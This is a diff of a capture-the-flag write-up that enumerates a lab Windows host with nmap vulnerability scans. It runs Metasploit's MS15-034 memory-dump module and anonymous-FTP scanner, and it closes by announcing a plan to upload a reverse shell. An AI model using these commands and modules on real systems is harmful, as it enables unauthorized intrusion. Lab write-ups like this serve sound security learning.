@@ -1,32 +1,11 @@
+## Another Day, Another NMAP
 ```
 hippoeug@kali:~$ nmap -sC -sV -A --script=vuln 10.10.10.5 -v -Pn
-Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-27 23:20 +08
-NSE: Loaded 149 scripts for scanning.
-NSE: Script Pre-scanning.
-Initiating NSE at 23:20
-Completed NSE at 23:20, 10.00s elapsed
-Initiating NSE at 23:20
-Completed NSE at 23:20, 0.00s elapsed
-Initiating Parallel DNS resolution of 1 host. at 23:20
-Completed Parallel DNS resolution of 1 host. at 23:20, 0.03s elapsed
-Initiating Connect Scan at 23:20
-Scanning 10.10.10.5 [1000 ports]
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-27 23:20 +0
+...
 Discovered open port 80/tcp on 10.10.10.5
 Discovered open port 21/tcp on 10.10.10.5
-Completed Connect Scan at 23:20, 4.53s elapsed (1000 total ports)
-Initiating Service scan at 23:20
-Scanning 2 services on 10.10.10.5
-Completed Service scan at 23:20, 6.15s elapsed (2 services on 1 host)
-NSE: Script scanning 10.10.10.5.
-Initiating NSE at 23:20
-NSE: [firewall-bypass] lacks privileges.
-Completed NSE at 23:23, 137.61s elapsed
-Initiating NSE at 23:23
-NSE: [tls-ticketbleed] Not running due to lack of privileges.
-Completed NSE at 23:23, 0.04s elapsed
-Nmap scan report for 10.10.10.5
-Host is up (0.013s latency).
-Not shown: 998 filtered ports
+...
 PORT   STATE SERVICE VERSION
 21/tcp open  ftp     Microsoft ftpd
 |_clamav-exec: ERROR: Script execution failed (use -d to debug)
@@ -40,38 +19,17 @@ PORT   STATE SERVICE VERSION
 Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
 ```
 
+So we know there is a FTP server, and a HTTP server running IIS. Let's KIV.
+Also, I wonder what does the vuln script show?
 ```
 hippoeug@kali:~$ nmap --script vuln 10.10.10.5 -Pn -v
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-27 23:31 +08
 NSE: Loaded 105 scripts for scanning.
-NSE: Script Pre-scanning.
-Initiating NSE at 23:31
-Completed NSE at 23:32, 10.00s elapsed
-Initiating NSE at 23:32
-Completed NSE at 23:32, 0.00s elapsed
-Initiating Parallel DNS resolution of 1 host. at 23:32
-Completed Parallel DNS resolution of 1 host. at 23:32, 0.00s elapsed
-Initiating Connect Scan at 23:32
-Scanning 10.10.10.5 [1000 ports]
+...
 Discovered open port 21/tcp on 10.10.10.5
 Discovered open port 80/tcp on 10.10.10.5
 Completed Connect Scan at 23:32, 6.36s elapsed (1000 total ports)
-NSE: Script scanning 10.10.10.5.
-Initiating NSE at 23:32
-NSE: [tls-ticketbleed] Not running due to lack of privileges.
-NSE: [firewall-bypass] lacks privileges.
-Stats: 0:01:50 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
-NSE: Active NSE Script Threads: 4 (3 waiting)
-NSE Timing: About 98.03% done; ETC: 23:33 (0:00:02 remaining)
-Stats: 0:02:14 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
-NSE: Active NSE Script Threads: 4 (3 waiting)
-NSE Timing: About 98.03% done; ETC: 23:34 (0:00:02 remaining)
-Completed NSE at 23:34, 136.07s elapsed
-Initiating NSE at 23:34
-Completed NSE at 23:34, 0.00s elapsed
-Nmap scan report for 10.10.10.5
-Host is up (0.0062s latency).
-Not shown: 998 filtered ports
+...
 PORT   STATE SERVICE
 21/tcp open  ftp
 |_clamav-exec: ERROR: Script execution failed (use -d to debug)
@@ -96,6 +54,8 @@ PORT   STATE SERVICE
 |_      https://technet.microsoft.com/en-us/library/security/ms15-034.aspx
 ```
 
+## First Attack, MS15-034, CVE-2015-1635
+Ezgame, another metasploit module!
 ```
 msf5 > use auxiliary/scanner/http/ms15_034_http_sys_memory_dump
 
@@ -163,39 +123,16 @@ msf5 > use auxiliary/scanner/http/ms15_034_http_sys_memory_dump
 3e 0d 0a 3c 2f 62 6f 64 79 3e 0d 0a 3c 2f 68 74    |>..</body>..</ht|
 6d 6c 3e                                           |ml>|
 ```
+Ah crap, nothing interesting mang. Back to searching for vulnerabilties.
 
+## NMAP, Second Attempt
 ```
 hippoeug@kali:~$ nmap -sC -sV 10.10.10.5 -Pn -v
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-27 23:44 +08
-NSE: Loaded 151 scripts for scanning.
-NSE: Script Pre-scanning.
-Initiating NSE at 23:44
-Completed NSE at 23:44, 0.00s elapsed
-Initiating NSE at 23:44
-Completed NSE at 23:44, 0.00s elapsed
-Initiating NSE at 23:44
-Completed NSE at 23:44, 0.00s elapsed
-Initiating Parallel DNS resolution of 1 host. at 23:44
-Completed Parallel DNS resolution of 1 host. at 23:44, 0.21s elapsed
-Initiating Connect Scan at 23:44
-Scanning 10.10.10.5 [1000 ports]
+...
 Discovered open port 80/tcp on 10.10.10.5
 Discovered open port 21/tcp on 10.10.10.5
-Completed Connect Scan at 23:44, 4.88s elapsed (1000 total ports)
-Initiating Service scan at 23:44
-Scanning 2 services on 10.10.10.5
-Completed Service scan at 23:44, 7.52s elapsed (2 services on 1 host)
-NSE: Script scanning 10.10.10.5.
-Initiating NSE at 23:44
-NSE: [ftp-bounce] PORT response: 501 Server cannot accept argument.
-Completed NSE at 23:44, 0.27s elapsed
-Initiating NSE at 23:44
-Completed NSE at 23:44, 0.04s elapsed
-Initiating NSE at 23:44
-Completed NSE at 23:44, 0.00s elapsed
-Nmap scan report for 10.10.10.5
-Host is up (0.0066s latency).
-Not shown: 998 filtered ports
+...
 PORT   STATE SERVICE VERSION
 21/tcp open  ftp     Microsoft ftpd
 | ftp-anon: Anonymous FTP login allowed (FTP code 230)
@@ -212,27 +149,17 @@ PORT   STATE SERVICE VERSION
 |_http-title: IIS7
 Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
 ```
+Going to `http://10.10.10.5`, we see the IIS welcome page.
+Trying `http://10.10.10.5/iisstart.htm` and `http://10.10.10.5/welcome.png` as seen on the FTP server, we get results! 
+So they're indeed connected and linked! FTP could be a good vector to attack from! Let's check the FTP out.
 
+## Attacking Again!
+We see FTP on Port 21 has `Anonymous FTP login allowed (FTP code 230)`
 ```
 msf5 > use auxiliary/scanner/ftp/anonymous
-msf5 auxiliary(scanner/ftp/anonymous) > options
-
-Module options (auxiliary/scanner/ftp/anonymous):
-
-   Name     Current Setting      Required  Description
-   ----     ---------------      --------  -----------
-   FTPPASS  mozilla@example.com  no        The password for the specified username
-   FTPUSER  anonymous            no        The username to authenticate as
-   RHOSTS                        yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
-   RPORT    21                   yes       The target port (TCP)
-   THREADS  1                    yes       The number of concurrent threads (max one per host)
-
-msf5 auxiliary(scanner/ftp/anonymous) > set rhost 10.10.10.5
-rhost => 10.10.10.5
-msf5 auxiliary(scanner/ftp/anonymous) > run
-
+...
 [+] 10.10.10.5:21         - 10.10.10.5:21 - Anonymous READ/WRITE (220 Microsoft FTP Service)
 [*] 10.10.10.5:21         - Scanned 1 of 1 hosts (100% complete)
 [*] Auxiliary module execution completed
 ```
-
+Interesting, `Anonymous READ/WRITE (220 Microsoft FTP Service)`. Let's upload a f*\*ken reverse shell!
